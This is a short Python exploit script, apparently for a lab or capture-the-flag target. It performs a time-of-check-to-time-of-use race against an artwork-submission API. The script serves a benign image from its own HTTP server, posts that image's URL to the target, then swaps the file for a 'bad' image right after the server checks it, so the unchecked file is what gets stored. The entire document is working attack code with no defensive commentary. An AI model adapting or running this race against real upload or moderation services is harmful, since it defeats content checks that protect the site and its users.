import threading
import time
import requests
import os
import shutil
from http.server import HTTPServer, SimpleHTTPRequestHandler


SAFE_IMG = "safe.png"
BAD_IMG = "bad.png"
SERVER_PORT = 8080
HOST_IP = "172.17.0.1"
TARGET_URL = "http://localhost:3000"

FILENAME = "art.jpg"

class Handler(SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=os.getcwd(), **kwargs)

def run_server():
    server = HTTPServer(("0.0.0.0", SERVER_PORT), Handler)
    server.serve_forever()

def main():
    threading.Thread(target=run_server, daemon=True).start()
    shutil.copy(SAFE_IMG, FILENAME)
    image_url = f"http://{HOST_IP}:{SERVER_PORT}/{FILENAME}"

    def send_request():
        try:
            resp = requests.post(
                f"{TARGET_URL}/api/artworks/submit",
                json={
                    "imageUrl": image_url,
                    "title": "TOCTOU",
                    "description": "Подменено после проверки"
                },
                timeout=10
            )
            print(f"Ответ сервера: {resp.status_code}")
        except Exception as e:
            print(f"Ошибка при получении ответа: {e}")


    threading.Thread(target=send_request).start()
    time.sleep(0.1)
    shutil.copy(BAD_IMG, FILENAME)
    time.sleep(5)

if __name__ == "__main__":
    main()